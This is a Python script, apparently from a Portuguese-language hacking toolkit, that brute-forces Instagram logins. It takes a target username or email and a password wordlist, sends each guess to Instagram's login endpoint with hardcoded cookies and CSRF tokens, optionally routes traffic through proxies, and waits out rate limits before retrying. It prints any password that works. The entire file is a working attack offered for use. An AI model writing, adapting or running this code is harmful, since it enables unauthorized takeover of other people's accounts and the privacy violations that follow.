import requests
from colores import *
from Zerasus import menu
from proxyis import proxis

try:
    select_proxymain()
    optio = input("-> ")
    clear()

    select_username()
    alvo = input("\n-> @ or email: ")
    clear()

    select_wordlist()
    wl = input("\n-> ")
    clear()

    print(f"{color.CYAN}Brute Instagram -> Target={alvo} Wordlist={wl} {color.END}")

    def Insta_no_proxy():
        try:
            file1 = open(wl, 'r')
            Lines = file1.readlines()
        except FileNotFoundError:
            print(f"{color.RED} ERROR 0x1: {color.END} {wl} file not find, make sure it is in the directory.")
            exit()

        rs = requests.session()
        for line in Lines:
            try:
                pstest = ("{}".format(line.strip()))
                password = pstest
                url = 'https://www.instagram.com/accounts/login/ajax/'
                headers = {
                    'accept': '*/*',
                    'accept-encoding': 'gzip, deflate, br',
                    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
                    'content-length': '275',
                    'content-type': 'application/x-www-form-urlencoded',
                    'cookie': 'csrftoken=DqBQgbH1p7xEAaettRA0nmApvVJTi1mR; ig_did=C3F0FA00-E82D-41C4-99E9-19345C41EEF2; mid=X8DW0gALAAEmlgpqxmIc4sSTEXE3; ig_nrcb=1',
                    'origin': 'https://www.instagram.com',
                    'referer': 'https://www.instagram.com/',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36',
                    'x-csrftoken': 'DqBQgbH1p7xEAaettRA0nmApvVJTi1mR',
                    'x-ig-app-id': '936619743392459',
                    'x-ig-www-claim': '0',
                    'x-instagram-ajax': 'bc3d5af829ea',
                    'x-requested-with': 'XMLHttpRequest'
                }
                data = {
                    'username': f'{alvo}',
                    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{password}',
                    'queryParams': '{}',
                    'optIntoOneTap': 'false'
                }
                r = rs.post(url, headers=headers, data=data)  # aq
                sleep(3)
                if 'authenticated":true' in r.text or 'userId' in r.text:
                    rs.headers.update({'X-CSRFToken': r.cookies['csrftoken']})
                    print(f"\r\n{color.CYAN}[ + ] SENHA ENCONTRADA [ + ]\r\nAccount: {alvo}:{password}{color.END}")
                    exit()
                elif not r.ok:
                    if 'Sorry, your password was incorrect. Please double-check your password.' in r.text:
                        print(f'{color.RED}[ !!! ] Conta bloqueada - A tentar novamente depois de 24hrs! [ !!! ]{color.END}')
                        sleep(1440)
                    else:
                        ed = rs.post(url, headers=headers, data=data)  # aq
                        if 'authenticated":true' in ed.text or 'userId' in ed.text:
                            rs.headers.update({'X-CSRFToken': r.cookies['csrftoken']})
                            print(f"\r\n{color.CYAN}[ + ] SENHA ENCONTRADA [ + ]\r\nAccount: {alvo}:{password}{color.END}")
                            exit()
                        else:
                            print(f"A Aguardar 5 min")
                            sleep(300)
                else:
                    print(f"\r\n[{color.RED} - {color.END}]{color.RED} Wrong password: {color.END}{password}")
                    print(f"{r.ok}")
            except Exception as err:
                print(f"[{color.RED} - {color.END}] {color.RED}Senha Incorreta: {color.END} password {err}")


    def Insta_Proxyes():
        proxis()
        try:
            file1 = open(wl, 'r')
            Lines = file1.readlines()
        except FileNotFoundError:
            print(f"{color.RED} ERROR 0x1: {color.END} {wl} file not find, make sure it is in the directory.")
            exit()

        rs = requests.session()
        for line in Lines:
            try:
                pstest = ("{}".format(line.strip()))
                password = pstest
                url = 'https://www.instagram.com/accounts/login/ajax/'
                headers = {
                    'accept': '*/*',
                    'accept-encoding': 'gzip, deflate, br',
                    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
                    'content-length': '275',
                    'content-type': 'application/x-www-form-urlencoded',
                    'cookie': 'csrftoken=DqBQgbH1p7xEAaettRA0nmApvVJTi1mR; ig_did=C3F0FA00-E82D-41C4-99E9-19345C41EEF2; mid=X8DW0gALAAEmlgpqxmIc4sSTEXE3; ig_nrcb=1',
                    'origin': 'https://www.instagram.com',
                    'referer': 'https://www.instagram.com/',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36',
                    'x-csrftoken': 'DqBQgbH1p7xEAaettRA0nmApvVJTi1mR',
                    'x-ig-app-id': '936619743392459',
                    'x-ig-www-claim': '0',
                    'x-instagram-ajax': 'bc3d5af829ea',
                    'x-requested-with': 'XMLHttpRequest'
                }
                data = {
                    'username': f'{alvo}',
                    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{password}',
                    'queryParams': '{}',
                    'optIntoOneTap': 'false'
                }
                r = rs.post(url, headers=headers, data=data)  # aq
                sleep(3)
                if 'authenticated":true' in r.text or 'userId' in r.text:
                    rs.headers.update({'X-CSRFToken': r.cookies['csrftoken']})
                    print(f"\r\n{color.CYAN}[ + ] SENHA ENCONTRADA [ + ]\r\nAccount: {alvo}:{password}{color.END}")
                    exit()
                elif not r.ok:
                    if 'Sorry, your password was incorrect. Please double-check your password.' in r.text:
                        print('Conta bloqueada')
                        sleep(2)
                        exit()
                    else:
                        ed = rs.post(url, headers=headers, data=data)  # aq
                        if 'authenticated":true' in ed.text or 'userId' in ed.text:
                            rs.headers.update({'X-CSRFToken': r.cookies['csrftoken']})
                            print(
                                f"\r\n{color.CYAN}[ + ] SENHA ENCONTRADA [ + ]\r\nAccount: {alvo}:{password}{color.END}")
                            exit()
                        else:
                            print(f"A Aguardar 5 min solicitacao: {r.content}")
                            sleep(130)
                else:
                    print(f"\r\n[{color.RED} - {color.END}]{color.RED} Wrong password: {color.END}{password}")
                    print(f"{r.ok}")
            except Exception as err:
                print(f"[{color.RED} - {color.END}] {color.RED}Wrong password: {color.END} password {err}")

    if optio == '1':
        Insta_no_proxy()
    elif optio == '2':
        Insta_Proxyes()
    else:
        print("Informe uma opcao na proxima")
        sleep(3)
        clear()
        print("De volta para o Menu!")
        sleep(2)
        menu()

except Exception:
    print(f"Ocorreu um erro: {Exception}")
    sleep(3)
    clear()
    print("De volta para o Menu!")
    sleep(2)
    menu()
